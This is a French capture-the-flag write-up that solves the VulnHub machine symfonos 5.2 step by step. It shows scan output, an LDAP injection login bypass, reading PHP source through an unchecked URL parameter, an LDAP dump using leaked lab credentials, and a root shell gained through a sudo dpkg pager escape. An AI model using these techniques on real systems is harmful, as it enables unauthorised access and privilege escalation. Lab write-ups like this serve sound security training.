# Solution du CTF Symfonos #5 de VulnHub

Le CTF [symfonos: 5.2](https://vulnhub.com/entry/symfonos-52,415/) était intéressant. J'ai mis pas mal de temps à avoir l'idée qu'il fallait pour l'exploitation web mais une fois cela passé ça n'a pris que quelques minutes pour passer root.

La liste des ports ouverts est bien sûr un indice :)

```
Nmap scan report for 192.168.56.116
Host is up (0.00027s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 1670137722f96878400d2176c1505423 (RSA)
|   256 a80623d093187d7a6b05778d8bc9ec02 (ECDSA)
|_  256 52c08318f4c738655ace9766f375684c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
```

## Astérix le hacker gaulois

J'ai commencé par afficher ce que je pouvais de la base LDAP sans disposer d'identifiants :

```shellsession
$ nmap -p 389 --script ldap-rootdse.nse 192.168.56.116
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 18:46 CET
Nmap scan report for 192.168.56.116
Host is up (0.00020s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       namingContexts: dc=symfonos,dc=local
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: SCRAM-SHA-1
|       supportedSASLMechanisms: SCRAM-SHA-256
|       supportedSASLMechanisms: GS2-IAKERB
|       supportedSASLMechanisms: GS2-KRB5
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: OTP
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema
```

Je me suis alors orienté vers le serveur web qu'il fallait énumérer, ce que j'ai fait en long et en large. Au final j'ai trouvé les scripts suivants :

```
302        0l        0w        0c http://192.168.56.116/logout.php
302        0l        0w        0c http://192.168.56.116/home.php
200       39l       79w     1650c http://192.168.56.116/admin.php
200       18l       21w      207c http://192.168.56.116/index.html
200        3l       12w      165c http://192.168.56.116/portraits.php
```

La page de login est `admin.php` et elle ne semble pas vulnérable à une injection SQL.

La page `portraits.php` affiche trois images de Zeus. J'ai regardé les tags `exif` des images et rien remarqué d'intéressant. L'une des images avait la chaine `Ducky` vers le début mais c'est apparamment lié au format JPG : [imagemagick - How can I display the orientation of a JPEG file? - Stack Overflow](https://stackoverflow.com/questions/9371273/how-can-i-display-the-orientation-of-a-jpeg-file#40055711)

Finalement j'ai pensé à l'injection LDAP. J'ai d'abord trouvé un article qui proposait une méthode de bypass mais ça ne fonctionnait pas. Finalement quand `HackTricks` a refait surface je me suis basé sur [LDAP Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/ldap-injection#login-bypass) et j'ai pu bypasser avec succès le login en saisissant `*` en nom d'utilisateur et password.

On pouvoit alors voir dans le site l'URL suivante :

`http://192.168.56.116/home.php?url=http://127.0.0.1/portraits.php`

Il ne s'agit pas d'une inclusion distante mais d'un directory traversal. On en a la confirmation si on passe `home.php` comme valeur au paramètre `url` :

```php
<?php
session_start();

if(!isset($_SESSION['loggedin'])){
	header("Location: admin.php");
	exit;
}

if (!empty($_GET["url"]))
{
$r = $_GET["url"];
$result = file_get_contents($r);
}

?>
```

Voyons voir comment est géré l'authentification dans `admin.php` :

```php
<?php
session_start();

if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: home.php");
    exit;
}

function authLdap($username, $password) {
  $ldap_ch = ldap_connect("ldap://172.18.0.22");

  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);

  if (!$ldap_ch) {
    return FALSE;
  }

  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");

  if (!$bind) {
    return FALSE;
  }

  $filter = "(&(uid=$username)(userPassword=$password))";
  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);

  if (!$result) {
    return FALSE;
  }

  $info = ldap_get_entries($ldap_ch, $result);

  if (!($info) || ($info["count"] == 0)) {
    return FALSE;
  }

  return TRUE;

}

if(isset($_GET['username']) && isset($_GET['password'])){

$username = urldecode($_GET['username']);
$password = urldecode($_GET['password']);

$bIsAuth = authLdap($username, $password);

if (! $bIsAuth ) {
	$msg = "Invalid login";
} else {
        $_SESSION["loggedin"] = true;
	header("location: home.php");
	exit;
}
}
?>
```

Avec ces identifiants je peux dumper la base LDAP :

```shellsession
$ ldapsearch -x -H ldap://192.168.56.116:389/ -D "cn=admin,dc=symfonos,dc=local" -w qMDdyZh3cT6eeAWD -b "dc=symfonos,dc=local" "(objectclass=*)"
# extended LDIF
#
# LDAPv3
# base <dc=symfonos,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# symfonos.local
dn: dc=symfonos,dc=local
objectClass: top
objectClass: dcObject
objectClass: organization
o: symfonos
dc: symfonos

# admin, symfonos.local
dn: cn=admin,dc=symfonos,dc=local
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=

# zeus, symfonos.local
dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
mail: zeus@symfonos.local
gecos: Zeus User

# search result
search: 2
result: 0 Success

# numResponses: 4
# numEntries: 3
```

Le mot de passe de `zeus` qui se décode en `cetkKf4wCuHC9FET` permet de se connecter via SSH.

## Et là tout va très vite

```shellsession
$ zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
```

Via cette permission sudo on peut exploiter un `GTFObin` (voir https://gtfobins.github.io/gtfobins/dpkg/#shell ). `dpkg -l` appelle le pager `less` et ce dernier permet d'appeller une commande avec le point d'exclamation :

```shellsession
zeus@symfonos5:~$ sudo /usr/bin/dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                          Version                     Architecture Description
+++-=============================-===========================-============-===============================================================================
ii  adduser                       3.118                       all          add and remove users and groups
ii  ame                           1.0                         amd64        no description given
ii  apparmor                      2.13.2-10                   amd64        user-space parser utility for AppArmor
ii  apt                           1.8.2                       amd64        commandline package manager
--- snip ---
!/bin/bash
root@symfonos5:/home/zeus# id
uid=0(root) gid=0(root) groups=0(root)
root@symfonos5:/home/zeus# cd /root
root@symfonos5:~# ls
proof.txt
root@symfonos5:~# cat proof.txt 
 
                    Congrats on rooting symfonos:5!
  
                                   ZEUS
              *      .            dZZZZZ,       .          *
                                 dZZZZ  ZZ,
     *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
                    ,ZZZZZZV'      ZZZZ   `Z,`\
                  ,ZZZ    ZZ   .    ZZZZ   `V
        *      ZZZZV'     ZZ         ZZZZ    \_              .
.              V   l   .   ZZ        ZZZZZZ          .
               l    \       ZZ,     ZZZ  ZZZZZZ,
   .          /            ZZ l    ZZZ    ZZZ `Z,
                          ZZ  l   ZZZ     Z Z, `Z,            *
                .        ZZ      ZZZ      Z  Z, `l
                         Z        ZZ      V  `Z   \
                         V        ZZC     l   V
           Z             l        V ZR        l      .
            \             \       l  ZA
                            \         C          C
                                  \   K   /    /             K
                          A    \   \  |  /  /              /
                           \        \\|/ /  /
   __________________________________\|/_________________________
            Contact me via Twitter @zayotic to give feedback!
```

*Publié le 22 février 2023*
